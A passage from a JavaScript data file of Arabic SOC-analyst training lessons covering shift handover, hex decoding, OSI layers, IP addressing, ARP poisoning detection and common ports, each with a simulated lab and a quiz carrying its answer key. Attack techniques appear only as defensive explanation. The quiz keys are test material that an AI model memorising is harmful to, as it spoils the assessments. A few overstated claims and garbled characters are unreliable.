          explanationAr: "يوفر الـ EDR رؤية مجهرية عميقة لما يدور داخل ذاكرة وعمليات الجهاز نفسه، بينما يوفر الـ SIEM رؤية بانورامية شاملة للمؤسسة بأكملها من خلال ربط سجلات الـ EDR بسجلات الشبكة والفايروول."
        }
      },
      {
        id: "lesson-1-6",
        courseId: "course-1",
        number: "1.6",
        titleAr: "جولة كاملة في يوم عمل حقيقي لمحلل SOC Tier 1 من لحظة استلام المناوبة (Shift Handover) حتى نهايتها",
        titleEn: "A Day in the Life of a SOC Tier 1 Analyst: Shift Handover to Logoff Walkthrough",
        duration: "50 min",
        theoryAr: `
<h3>يوم حقيقي داخل غرفة العمليات: كيف يقضي محلل الـ SOC ساعات مناوبته الثماني؟</h3>
<p class="lead">لكي تنجح في مقابلات العمل وتندمج بسرعة في أي فريق احترافي، يجب أن تتخيل الروتين اليومي الواقعي لمحلل الـ SOC من الدقيقة الأولى وحتى نهاية اليوم.</p>

<h4>1. الدقائق الأولى (08:00 - 08:30) - استلام المناوبة (Shift Handover Meeting)</h4>
<p>أهم نصف ساعة في اليوم؛ لا تبدأ بالعمل عشوائياً، بل تجلس مع المحلل في المناوبة السابقة لمراجعة "تقرير تسليم المناوبة":</p>
<ul>
  <li>ما هي الحوادث المفتوحة التي لم تُغلق بعد وتتطلب متابعة مستمرة؟</li>
  <li>هل هناك صيانة مجدولة في خوادم الشركة قد تطلق تنبيهات كاذبة؟</li>
  <li>هل توجد حملات تصيد احتيالي عالمية جديدة استهدفت القطاع الذي تعمل فيه المؤسسة خلال الليل؟</li>
</ul>

<h4>2. فترة الذروة والفرز المستمر (08:30 - 12:30) - فحص طابور التنبيهات (Queue Monitoring)</h4>
<p>الجلوس أمام واجهة الـ SIEM وفرز التنبيهات ذات الأولوية العالية (High/Critical) فور ظهورها، مع تطبيق مبدأ "التصنيف الثلاثي": إيجابي كاذب (FP) وإغلاق التذكرة بتبرير واضح، أو إيجابي حقيقي (TP) وتفعيل خطة الاحتواء فوراً.</p>

<h4>3. فترة ما بعد الظهيرة (01:30 - 03:30) - التعمق والتوثيق (Deep Analysis & Documentation)</h4>
<p>تحليل العينات المشبوهة، فحص العناوين عبر منصات OSINT، كتابة تذاكر التحقيق بتنسيق فني دقيق، والتواصل مع الموظفين للتأكد من سلوكيات معينة (مثل تأكيد قيام موظف بتنزيل برنامج إدارة ملفات).</p>

<h4>4. النصف ساعة الأخيرة (03:30 - 04:00) - إعداد تقرير التسليم ومغادرة المقعد</h4>
<p>توثيق كل الإحصائيات (عدد التنبيهات المفروزة، التذاكر المصعدة، والتنبيهات المعلقة)، والجلوس مع الزميل القادم لاستلام المناوبة التالية لتكرار نفس الدورة بسلاسة.</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 تمرين استلام المناوبة (Shift Handover Exercise)</span>
    <h4>قراءة وتوقيع تقرير تسليم مناوبة الـ SOC</h4>
  </div>
  <p>أنت الآن تستلم مناوبة الصباح في الساعة 08:00، راجع الملخص المسلم لك من الزميل أحمد:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> soc-shift-handover-doc</div>
    <pre class="terminal-code">=== SHIFT HANDOVER LOG (NIGHT -> MORNING) ===
Date: 2026-11-07 | Handed over by: Analyst Ahmed (Night Shift)
Active Incidents:
- INC-8901: Potential lateral movement on 10.0.5.12. Host isolated. Tier 2 investigating.
Scheduled Maintenance:
- IT Infrastructure team updating Exchange Server from 09:00 to 11:00 UTC. Expect auth logs spike.
Threat Intel Advisory:
- Active Phishing campaign pretending to be corporate salary updates. 3 emails intercepted at gateway.</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('shift-sign-ack --analyst=Student', 'standalone-term-body'); app.showToast('تم اعتماد وتوقيع استلام المناوبة بنجاح', 'success');">توقيع استلام المناوبة الأمنية</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هي الأهمية الحاسمة لاجتماع تسليم المناوبة (Shift Handover) في غرفة الـ SOC؟",
          questionEn: "Why is the Shift Handover critical in a 24/7 SOC?",
          optionsAr: [
            "لضمان استمرارية المراقبة الأمنية وعدم إهمال أي حوادث نشطة قيد التحقيق أثناء تبادل فترات عمل المحللين",
            "فقط للدردشة وتناول وجبة الإفطار مع الزملاء",
            "لإعادة تشغيل جميع أجهزة السيرفرات في الشركة دفعة واحدة",
            "لتغيير كلمات مرور جميع مستخدمي الشركة يومياً"
          ],
          optionsEn: [
            "To guarantee continuous security coverage and ensure ongoing active incidents are not dropped during analyst rotations",
            "Solely for casual breakfast discussions",
            "To restart all corporate servers simultaneously",
            "To reset all corporate employee passwords daily"
          ],
          correctIndex: 0,
          explanationAr: "في بيئة العمل 24/7، تقع أخطر الثغرات عند تبديل المناوبات إذا لم يكن المحلل الجديد على دراية تامة بالحوادث الجارية والمشكلات الاستثنائية التي حدثت أثناء غيابه."
        }
      }
    ]
  },
  {
    id: "course-2",
    courseNumber: 2,
    level: "beginner",
    levelNameAr: "المستوى الأول: مبتدئ",
    levelNameEn: "Level 1: Beginner",
    levelBadgeColor: "#10B981",
    titleAr: "أساسيات الحاسوب، الشبكات، والبروتوكولات لمحلل السوك",
    titleEn: "Computing, Networking & Protocol Deep Dive for SOC",
    summaryAr: "الفهم المجهري للشبكات: كيف تفكر الحواسيب بالنظام الثنائي والست عشري؟ تشريح نموذج OSI و TCP/IP، عناوين IP و MAC، أشهر 30 بورت أمني، أعلام الـ TCP، والتشريح الكامل لبروتوكولات DNS, HTTP, DHCP, و معمارية الشبكات المؤمنة.",
    summaryEn: "Microscopic networking foundations: Binary/Hex, OSI 7 Layers, TCP/IP, Ports, TCP Flags, DNS, HTTP/S, and secure enterprise network topology.",
    icon: "🌐",
    duration: "10 ساعات تدريبية",
    lessonsCount: 10,
    badgeAr: "مختص بروتوكولات الشبكات",
    badgeEn: "Network Defense Specialist",
    lessons: [
      {
        id: "lesson-2-1",
        courseId: "course-2",
        number: "2.1",
        titleAr: "كيف يعمل الكمبيوتر والنظام الثنائي والست عشري (Binary, Hex, ASCII) وكيف نقرأها في حزم الشبكة والذاكرة؟",
        titleEn: "Binary, Hexadecimal & ASCII: Reading Network Packets and Memory Dumps",
        duration: "50 min",
        theoryAr: `
<h3>لغة الآلة الصريحة: كيف تفهم البيانات كحزم وبتات في سلك الشبكة؟</h3>
<p class="lead">لا تفهم المعالجات ولا بطاقات الشبكة الحروف أو الكلمات الإنجليزية أو العربية؛ كل ما يتدفق عبر الأسلاك الكهربائية أو الألياف الضوئية هو نبضات ثنائية (Bits: 0 و 1). محلل الـ SOC المحترف يرى ما وراء الشاشات الجذابة ويستطيع قراءة البيانات الخام المنقولة في حزم الشبكة وسجلات الذاكرة.</p>

<h4>1. النظام الثنائي (Binary - Base 2)</h4>
<p>يتكون فقط من رقمين: <code>0</code> و <code>1</code>. كل خانة تمثل مضاعفاً للرقم 2 (1, 2, 4, 8, 16, 32, 64, 128). البايت الواحد (Byte) يساوي 8 بتات، ويستطيع تمثيل الأرقام من 0 إلى 255 (وهو نفس النطاق المستخدم في كل خانة من خانات عنوان الـ IPv4!).</p>

<h4>2. النظام الست عشري (Hexadecimal - Base 16)</h4>
<p>لأن كتابة الآلاف من الأصفار والواحدات تسبب إرهاقاً بصرياً شديداً للمحللين، تم اختراع النظام الست عشري الذي يضغط كل 4 بتات (Nibble) في رمز واحد من <code>0</code> إلى <code>F</code> (0-9 ثم A=10, B=11, C=12, D=13, E=14, F=15). البايت الكامل يُمثل برمزين فقط في الـ Hex (مثلاً <code>FF = 255</code>).</p>

<h4>3. جدول ترميز ASCII والسحر الأمني لقراءة الحزم</h4>
<p>يربط جدول ASCII كل حرف برقم عشري وست عشري محدد. على سبيل المثال:</p>
<ul>
  <li>الحرف <code>A</code> = 65 بالنظام العشري = <code>0x41</code> بالـ Hex = <code>01000001</code> بالـ Binary.</li>
  <li>توقيع الملفات التنفيذية في ويندوز (Magic Bytes): يبدأ أي ملف <code>.exe</code> دائماً بالحرفين <code>MZ</code> والتي تظهر بالـ Hex كـ <code>4D 5A</code>. إذا رأيت في باكت شبكة أو في ذاكرة جهاز بايتات تبدأ بـ <code>4D 5A</code> فاعلم فوراً أن ملفاً تنفيذياً يُنقل أو يُحقن في الذاكرة!</li>
  <li>توقيع ملفات الـ PDF: يبدأ دائماً بـ <code>%PDF</code> وتظهر بالـ Hex كـ <code>25 50 44 46</code>.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي قراءة البايتات الخام (Hex & ASCII Decoder)</span>
    <h4>فك حمولة باكت مشبوه مستخرج من الشبكة</h4>
  </div>
  <p>تفحص البايتات المستخرجة من جلسة اتصال بالـ Hex، وحولها لنص ASCII مقروء:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> packet-hex-dump</div>
    <pre class="terminal-code">0000: 47 45 54 20 2f 61 64 6d  69 6e 2e 70 68 70 20 48   GET /admin.php H
0010: 54 54 50 2f 31 2e 31 0d  0a 48 6f 73 74 3a 20 74   TTP/1.1..Host: t
0020: 61 72 67 65 74 2e 6c 6f  63 61 6c 0d 0a            arget.local..</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('hex2ascii \"47 45 54 20 2f\"', 'standalone-term-body'); app.showToast('تم فك التشفير الست عشري: GET /', 'success');">فك أول 5 بايتات: 47 45 54 20 2f</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما الذي يدل عليه وجود البايتات السحرية (Magic Bytes) رقم `4D 5A` (المقابلة لـ MZ في ASCII) في بداية بايتات تدفق شبكي مشبوه؟",
          questionEn: "What does the presence of magic bytes 4D 5A (ASCII MZ) indicate in packet payload?",
          optionsAr: [
            "يدل بشكل قاطع على نقل ملف تنفيذي خاص بنظام ويندوز (Windows PE Executable / DLL)",
            "يدل على صورة بصيغة PNG عالية الدقة",
            "يدل على رسالة بريد إلكتروني فارغة",
            "يدل على كابل شبكة غير متصل بالحاسوب"
          ],
          optionsEn: [
            "It definitively indicates the transmission of a Windows PE Executable / DLL file",
            "A high-res PNG image",
            "An empty email",
            "A disconnected cable"
          ],
          correctIndex: 0,
          explanationAr: "تسمى هذه البايتات بتوقيع DOS Header (MZ نسبة إلى مصمم النظام Mark Zbikowski)، وهي موجودة في بداية جميع ملفات EXE و DLL لويندوز، ويستخدمها المحللون لكشف البرمجيات الخبيثة المتخفية بامتدادات وهمية."
        }
      },
      {
        id: "lesson-2-2",
        courseId: "course-2",
        number: "2.2",
        titleAr: "شرح نموذج OSI Model (الطبقات الـ 7) ونموذج TCP/IP مع تتبع رحلة الباكت (Packet Encapsulation)",
        titleEn: "OSI 7 Layers & TCP/IP Model: Packet Encapsulation & Decapsulation Walkthrough",
        duration: "55 min",
        theoryAr: `
<h3>رحلة البيانات عبر الأسلاك: من نقرة المستخدم حتى الموجة الكهرومغناطيسية</h3>
<p class="lead">لكي تنتقل رسالة من متصفحك إلى خادم في قارة أخرى، يجب أن تمر برحلة تغليف صارمة (Encapsulation) تضاف فيها ترويسة (Header) من كل طبقة، وتُفكك عند الوصول (Decapsulation).</p>

<h4>الطبقات السبع لنموذج OSI وكيف يراها محلل الـ SOC:</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>رقم الطبقة واسمها</th>
        <th>الوحدة (PDU)</th>
        <th>البروتوكولات الشائعة</th>
        <th>الهجمات السيبرانية في هذه الطبقة</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>7. التطبيق (Application)</strong></td>
        <td>Data</td>
        <td>HTTP, HTTPS, DNS, SMTP, SSH</td>
        <td>SQLi, XSS, Phishing, Web Shells, DNS Tunneling</td>
      </tr>
      <tr>
        <td><strong>6. العرض (Presentation)</strong></td>
        <td>Data</td>
        <td>SSL/TLS, ASCII, JPEG</td>
        <td>SSL Stripping, Malicious Encoding, Exploit Payloads</td>
      </tr>
      <tr>
        <td><strong>5. الجلسة (Session)</strong></td>
        <td>Data</td>
        <td>RPC, NetBIOS, SMB Session</td>
        <td>Session Hijacking, Pass-the-Hash</td>
      </tr>
      <tr>
        <td><strong>4. النقل (Transport)</strong></td>
        <td>Segment</td>
        <td>TCP, UDP</td>
        <td>SYN Flood, Port Scanning, TCP Reset Attacks</td>
      </tr>
      <tr>
        <td><strong>3. الشبكة (Network)</strong></td>
        <td>Packet</td>
        <td>IPv4, IPv6, ICMP, IPsec</td>
        <td>IP Spoofing, ICMP Tunneling, Route Poisoning</td>
      </tr>
      <tr>
        <td><strong>2. ربط البيانات (Data Link)</strong></td>
        <td>Frame</td>
        <td>Ethernet, ARP, MAC, VLAN (802.1Q)</td>
        <td>ARP Poisoning / MITM, MAC Flooding, VLAN Hopping</td>
      </tr>
      <tr>
        <td><strong>1. الفيزيائية (Physical)</strong></td>
        <td>Bits</td>
        <td>Cables, Fiber, Wi-Fi Radio, Hubs</td>
        <td>Wiretapping, Jamming, Physical Keyloggers</td>
      </tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي تفكيك الطبقات (Packet Dissector)</span>
    <h4>مشاهدة عملية Encapsulation لحزمة HTTP فعلية</h4>
  </div>
  <p>تتبع الترويسات المتتالية للحزمة من الطبقة السابعة حتى الثانية:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> pdu-dissector</div>
    <pre class="terminal-code">[Layer 2 Ethernet Frame] Src MAC: 00:0c:29:8b:21:aa -> Dst MAC: cc:46:d6:12:33:01 (Type: 0x0800 IPv4)
 â””â”€ [Layer 3 IPv4 Packet] Src IP: 192.168.1.50 -> Dst IP: 93.184.216.34 (Proto: 6 TCP, TTL: 64)
     â””â”€ [Layer 4 TCP Segment] Src Port: 54102 -> Dst Port: 80 (Flags: [ACK, PSH], Seq: 1, Ack: 1)
         â””â”€ [Layer 7 Application Data] GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في أي طبقة من طبقات نموذج OSI يعمل بروتوكول الـ ARP وعناوين الـ MAC Address؟",
          questionEn: "At which OSI layer do ARP and MAC Addresses operate?",
          optionsAr: [
            "الطبقة الثانية (Data Link Layer)",
            "الطبقة الثالثة (Network Layer)",
            "الطبقة الرابعة (Transport Layer)",
            "الطبقة السابعة (Application Layer)"
          ],
          optionsEn: [
            "Layer 2 (Data Link Layer)",
            "Layer 3 (Network Layer)",
            "Layer 4 (Transport Layer)",
            "Layer 7 (Application Layer)"
          ],
          correctIndex: 0,
          explanationAr: "يعمل الـ MAC Address و الـ ARP في الطبقة الثانية (Data Link Layer) المسؤولة عن نقل الإطارات (Frames) محلياً بين الأجهزة المتصلة على نفس السويتش أو الشبكة المحلية."
        }
      },
      {
        id: "lesson-2-3",
        courseId: "course-2",
        number: "2.3",
        titleAr: "عناوين الـ IPv4 و IPv6، الفرق بين Public/Private/NAT/Loopback، وتقسيم الشبكات (Subnetting & CIDR) ببساطة",
        titleEn: "IP Addressing Mastery: IPv4 vs IPv6, Public, RFC 1918 Private, NAT & CIDR Subnetting",
        duration: "50 min",
        theoryAr: `
<h3>الجغرافيا الرقمية: كيف تعنون الأجهزة وتُعزل شبكات الشركات؟</h3>
<p class="lead">عنوان الـ IP هو المعرف المنطقي لأي جهاز على الشبكة. كمحلل SOC، يجب أن تميز بلمحة عين واحدة هل هذا العنوان داخلي محلي أم عام على الإنترنت، وما هو نطاق الشبكة المعزولة.</p>

<h4>1. النطاقات الخاصة المعيارية RFC 1918 (Private IP Ranges)</h4>
<p>عناوين مجانية محجوزة للاستخدام الداخلي فقط ولا يمكن توجيهها (Unroutable) مباشرة عبر الإنترنت:</p>
<ul>
  <li><strong>فئة Class A:</strong> <code>10.0.0.0</code> إلى <code>10.255.255.255</code> (قناع <code>10.0.0.0/8</code>) - شائعة جداً في كبرى الشركات والبنوك.</li>
  <li><strong>فئة Class B:</strong> <code>172.16.0.0</code> إلى <code>172.31.255.255</code> (قناع <code>172.16.0.0/12</code>).</li>
  <li><strong>فئة Class C:</strong> <code>192.168.0.0</code> إلى <code>192.168.255.255</code> (قناع <code>192.168.0.0/16</code>) - شائعة في المكاتب الصغيرة والمنازل.</li>
  <li><strong>عنوان الاسترجاع الداخلي (Loopback):</strong> <code>127.0.0.1</code> (يخاطب به الجهاز نفسه).</li>
  <li><strong>عناوين APIPA التلقائية:</strong> <code>169.254.x.x</code> (تظهر عندما يفشل الجهاز في استلام عنوان من سيرفر DHCP).</li>
</ul>

<h4>2. ترجمة عناوين الشبكة (NAT - Network Address Translation)</h4>
<p>تسمح لآلاف الأجهزة في الشبكة الداخلية ذات العناوين الخاصة بالخروج إلى الإنترنت باستخدام عنوان IP عام واحد (Public IP)، مما يحجب عناوين الأجهزة الداخلية عن المهاجمين الخارجيين ويوفر استهلاك العناوين.</p>

<h4>3. حسابات الـ CIDR وتقسيم الشبكات (Subnetting) ببساطة</h4>
<p>رمز <code>/24</code> يعني أن أول 24 بت مخصصة لعنوان الشبكة، وآخر 8 بتات مخصصة للأجهزة (يعطي 254 جهازاً متاحاً: <code>2^8 - 2</code>). بينما <code>/16</code> يعطي 65,534 جهازاً.</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 فحص العناوين (IP Range Classifier)</span>
    <h4>تصنيف نطاقات العناوين في سجلات الفايروول</h4>
  </div>
  <p>أدخل الأمر التالي لتصنيف عناوين الاتصال المشبوهة:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> ip-classifier</div>
    <pre class="terminal-code">Src: 10.10.4.19  -> [RFC 1918 Private Class A - Internal Workstation]
Dst: 8.8.8.8     -> [Public Internet IP - Google Public DNS]
Src: 169.254.1.8 -> [APIPA Unconfigured - DHCP Failure on Host]
Dst: 127.0.0.1   -> [Local Loopback - Local Host Process Communication]</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "إذا لاحظ محلل الـ SOC أن حاسوب موظف يحمل العنوان `169.254.40.15`، فماذا يعني ذلك تقنياً؟",
          questionEn: "What does an IP of 169.254.x.x indicate?",
          optionsAr: [
            "الجهاز لم يستطع الحصول على عنوان IP من خادم الـ DHCP وقام بتعيين عنوان APIPA تلقائي لنفسه",
            "الجهاز تعرض للاختراق وتم تشفيره ببرمجية فدية",
            "الجهاز متصل مباشرة بسيرفر الـ Domain Controller",
            "الجهاز يمتلك أسرع سرعة اتصال بالإنترنت في المؤسسة"
          ],
          optionsEn: [
            "The host failed to obtain an IP from DHCP and assigned an APIPA address",
            "The host is encrypted by ransomware",
            "The host is connected directly to DC",
            "The host has the fastest connection"
          ],
          correctIndex: 0,
          explanationAr: "تسمى عناوين 169.254 بـ APIPA (Automatic Private IP Addressing)، وتظهر فور فشل الحاسوب في الوصول لخادم DHCP، مما يؤدي لانقطاع اتصاله بالإنترنت والشبكة المحلية الفعلية."
        }
      },
      {
        id: "lesson-2-4",
        courseId: "course-2",
        number: "2.4",
        titleAr: "عناوين الـ MAC Address وبروتوكول ARP (كيف يعمل؟ وكيف يستغله الهكر في ARP Spoofing / MITM؟)",
        titleEn: "MAC Addressing & ARP Protocol: Mechanism, Poisoning, Spoofing & MITM Attacks",
        duration: "50 min",
        theoryAr: `
<h3>الهوية الفيزيائية للأجهزة وهشاشة الثقة العمياء في بروتوكول ARP</h3>
<p class="lead">عنوان الـ MAC (Media Access Control) هو المعرف الفيزيائي المحفور على بطاقة الشبكة (NIC) المكون من 48 بت (6 خانات ست عشرية). لكي يتصل جهازان في نفس الشبكة المحلية، يجب أن يعرف كل منهما عنوان الـ MAC للآخر عبر بروتوكول ARP (Address Resolution Protocol).</p>

<h4>كيف يعمل بروتوكول ARP الطبيعي؟</h4>
<ol>
  <li>الجهاز A (192.168.1.10) يريد التحدث مع الراوتر (192.168.1.1) لكنه لا يعرف عنوان الـ MAC للراوتر.</li>
  <li>يرسل الجهاز A رسالة بث عام (ARP Request - Broadcast): <em>"من يملك IP رقم 192.168.1.1؟ يرجى إبلاغي بعنوان الـ MAC الخاص بك!"</em>.</li>
  <li>يستقبل الراوتر الرسالة ويرد برسالة أحادية (ARP Reply - Unicast): <em>"أنا أملك هذا الـ IP، وعنوان الماك الخاص بي هو <code>cc:46:d6:12:33:01</code>"</em>.</li>
  <li>يحفظ الجهاز A هذه المعلومة في ذاكرة التخزين المؤقت (ARP Cache).</li>
</ol>

<h4>الثغرة القاتلة: هجوم تسميم الـ ARP (ARP Poisoning / Spoofing)</h4>
<p>بروتوكول ARP ليس به أي نظام تحقق أو كلمات سر (Stateless & Unauthenticated)! يستطيع أي مهاجم داخل الشبكة إرسال رسائل ARP Reply كاذبة دون أن يطلبها أحد (Gratuitous ARP)، قائلاً للحاسوب: <em>"أنا الراوتر!"</em>، وقائلاً للراوتر: <em>"أنا الحاسوب!"</em>.</p>
<p>النتيجة: تصبح كل حركة البيانات تمر عبر جهاز المهاجم أولاً قبل وصولها للراوتر، وهو ما يعرف بهجوم <strong>رجل في المنتصف (Man-in-the-Middle - MITM)</strong>، مما يسمح للمهاجم بسرقة كلمات المرور غير المشفرة أو تعديل البيانات أثناء انتقالها!</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف تسميم الـ ARP (ARP Spoofing Detection)</span>
    <h4>مقارنة جدول الـ ARP للكشف عن تكرار عناوين الـ MAC</h4>
  </div>
  <p>نفذ أمر عرض جدول الـ ARP لملاحظة التكرار المشبوه:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> arp-cache-checker</div>
    <pre class="terminal-code">C:\Windows\System32> arp -a
Interface: 192.168.1.50 --- 0xb
  Internet Address      Physical Address      Type
  192.168.1.1           00-0c-29-8b-21-99     dynamic  <-- Default Gateway!
  192.168.1.105         00-0c-29-8b-21-99     dynamic  <-- ATTACKER LAPTOP!
[WARNING] Duplicate MAC Address detected for Gateway IP! Possible ARP Poisoning in progress!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('arp -a', 'standalone-term-body'); app.showToast('تم فحص جدول الـ ARP', 'info');">فحص جدول الـ ARP: arp -a</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "كيف يستدل محلل الـ SOC من فحص جدول الـ ARP Cache في جهاز الضحية على وقوع هجوم ARP Poisoning؟",
          questionEn: "How does a SOC Analyst spot ARP Poisoning from the ARP cache?",
          optionsAr: [
            "عندما يرى أن عنوانين IP مختلفين (مثل الراوتر وجهاز زميل مشبوه) يقترنان بنفس عنوان الـ MAC الفيزيائي تماماً",
            "عندما يرى أن سرعة اتصال الإنترنت انخفضت بنسبة 5%",
            "عندما تختفي جميع أرقام الـ IP وتتحول إلى نصوص باللغة الإنجليزية",
            "عندما يتغير لون كابل الشبكة من الأزرق إلى الأحمر"
          ],
          optionsEn: [
            "When two different IP addresses (e.g., Gateway and a suspicious workstation) share the exact same MAC address",
            "When internet speed drops 5%",
            "When IPs turn into English words",
            "When cable color changes"
          ],
          correctIndex: 0,
          explanationAr: "في الوضع الطبيعي، يمتلك كل جهاز عنوان MAC فريداً؛ فإذا رأيت أن عنوان بوابة الشبكة (Gateway) وعنوان جهاز آخر لهما نفس الـ MAC، فهذا دليل قاطع على أن المهاجم يسمم جدول الـ ARP ليتظاهر بأنه الراوتر."
        }
      },
      {
        id: "lesson-2-5",
        courseId: "course-2",
        number: "2.5",
        titleAr: "المنافذ (Ports: 1-65535) وأشهر 30 بورت يجب أن يحفظها كل محلل SOC عن ظهر قلب",
        titleEn: "Port Fundamentals (1-65535) & Top 30 Essential Ports for SOC Analysts",
        duration: "50 min",
        theoryAr: `
<h3>أبواب العبور الرقمية: خريطة المنافذ في العالم السيبراني</h3>
<p class="lead">إذا كان عنوان الـ IP يمثل عنوان العمارة السكنية، فإن المنفذ (Port) يمثل رقم الشقة المحددة داخل العمارة. يمتلك كل جهاز 65,535 منفذاً لبروتوكول TCP ومثلها لبروتوكول UDP. حفظ هذه المنافذ عن ظهر قلب هو حجر الزاوية لكل محلل أمني لقراءة سجلات الجدران النارية والـ SIEM دون تردد.</p>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>المنفذ (Port)</th>
        <th>البروتوكول</th>
        <th>الخدمة (Service)</th>
        <th>الأهمية الأمنية لمحلل الـ SOC</th>
      </tr>
    </thead>
    <tbody>
      <tr><td><strong>20 / 21</strong></td><td>TCP</td><td>FTP (File Transfer)</td><td>نقل ملفات غير مشفر؛ كلمات المرور تتدفق كنص صريح (Cleartext).</td></tr>
      <tr><td><strong>22</strong></td><td>TCP</td><td>SSH / SFTP</td><td>إدارة الخوادم الآمنة والمشفرة، هدف دائم لهجمات التخمين (Brute Force).</td></tr>
      <tr><td><strong>23</strong></td><td>TCP</td><td>Telnet</td><td>إدارة قديمة غير مشفرة، وجودها في شبكة حديثة يعد ثغرة أمنية فورية.</td></tr>
      <tr><td><strong>25</strong></td><td>TCP</td><td>SMTP</td><td>إرسال البريد الإلكتروني؛ المنفذ الأساسي لحملات التصيد وحركة الـ Spam.</td></tr>
      <tr><td><strong>53</strong></td><td>TCP/UDP</td><td>DNS</td><td>ترجمة النطاقات؛ يستغله المخترقون في الـ DNS Tunneling وسرقة البيانات.</td></tr>
      <tr><td><strong>67 / 68</strong></td><td>UDP</td><td>DHCP</td><td>توزيع العناوين التلقائي؛ هدف لهجمات DHCP Starvation و Rogue DHCP.</td></tr>
      <tr><td><strong>69</strong></td><td>UDP</td><td>TFTP</td><td>نقل ملفات بسيط بدون توثيق أو تشفير، يستخدم لترقية أجهزة الراوتر.</td></tr>
      <tr><td><strong>80</strong></td><td>TCP</td><td>HTTP</td><td>تصفح الويب غير المشفر؛ هدف لهجمات OWASP والحقن والتنصت.</td></tr>
      <tr><td><strong>88</strong></td><td>TCP/UDP</td><td>Kerberos</td><td>قلب التوثيق في الـ Active Directory؛ هدف لهجمات Kerberoasting الشهيرة.</td></tr>
      <tr><td><strong>110</strong></td><td>TCP</td><td>POP3</td><td>استقبال البريد القديم غير المشفر.</td></tr>
      <tr><td><strong>123</strong></td><td>UDP</td><td>NTP</td><td>مزامنة التوقيت؛ حاسم جداً للـ Logs ويستغل في هجمات NTP Amplification DDoS.</td></tr>
      <tr><td><strong>135</strong></td><td>TCP</td><td>MSRPC / RPC</td><td>تنفيذ الإجراءات عن بُعد في ويندوز؛ بوابة أساسية للتحرك الجانبي (Lateral Movement).</td></tr>
      <tr><td><strong>137-139</strong></td><td>TCP/UDP</td><td>NetBIOS</td><td>استكشاف أسماء أجهزة الشبكة في ويندوز؛ هدف لهجمات تسميم LLMNR.</td></tr>
      <tr><td><strong>143</strong></td><td>TCP</td><td>IMAP</td><td>استقبال وتصفح البريد الإلكتروني.</td></tr>
      <tr><td><strong>161 / 162</strong></td><td>UDP</td><td>SNMP</td><td>مراقبة أجهزة الشبكة؛ استغلال كلمات السر الافتراضية (Community String: public).</td></tr>
      <tr><td><strong>389</strong></td><td>TCP/UDP</td><td>LDAP</td><td>الاستعلام عن مستخدمي الدليل النشط Active Directory.</td></tr>
      <tr><td><strong>443</strong></td><td>TCP</td><td>HTTPS</td><td>تصفح الويب المشفر بتشفير TLS/SSL؛ يختبئ فيه أغلب ترافيك المالوير المعاصر.</td></tr>
      <tr><td><strong>445</strong></td><td>TCP</td><td>SMB (Server Message Block)</td><td>مشاركة الملفات في ويندوز؛ أشهر منفذ استغلته ديدان WannaCry و EternalBlue.</td></tr>
      <tr><td><strong>465 / 587</strong></td><td>TCP</td><td>SMTPS / Submission</td><td>إرسال البريد المشفر الآمن.</td></tr>
      <tr><td><strong>636</strong></td><td>TCP</td><td>LDAPS</td><td>استعلامات الدليل النشط الآمنة والمشفرة بـ SSL.</td></tr>
      <tr><td><strong>993</strong></td><td>TCP</td><td>IMAPS</td><td>استقبال البريد المشفر الآمن.</td></tr>
      <tr><td><strong>995</strong></td><td>TCP</td><td>POP3S</td><td>استقبال البريد المشفر الآمن.</td></tr>
      <tr><td><strong>1433</strong></td><td>TCP</td><td>Microsoft SQL Server</td><td>قواعد بيانات ويندوز؛ هدف لحقن الـ SQL والتخمين المباشر.</td></tr>
      <tr><td><strong>1521</strong></td><td>TCP</td><td>Oracle Database</td><td>قواعد بيانات أوراكل المؤسسية.</td></tr>
      <tr><td><strong>3306</strong></td><td>TCP</td><td>MySQL Database</td><td>قواعد بيانات الويب الأكثر انتشاراً.</td></tr>
      <tr><td><strong>3389</strong></td><td>TCP/UDP</td><td>RDP (Remote Desktop)</td><td>سطح المكتب البعيد لويندوز؛ الهدف الأول لعصابات الفدية للدخول والسيطرة.</td></tr>
      <tr><td><strong>5432</strong></td><td>TCP</td><td>PostgreSQL</td><td>قواعد البيانات مفتوحة المصدر المتقدمة.</td></tr>
      <tr><td><strong>5985 / 5986</strong></td><td>TCP</td><td>WinRM (HTTP/HTTPS)</td><td>إدارة ويندوز عن بُعد عبر PowerShell Remoting؛ أداة مفضلة للمهاجمين.</td></tr>
      <tr><td><strong>8080 / 8443</strong></td><td>TCP</td><td>HTTP-Proxy / Alt-Web</td><td>منافذ ويب بديلة وخوادم البروكسي وتطبيقات الويب التطويرية.</td></tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
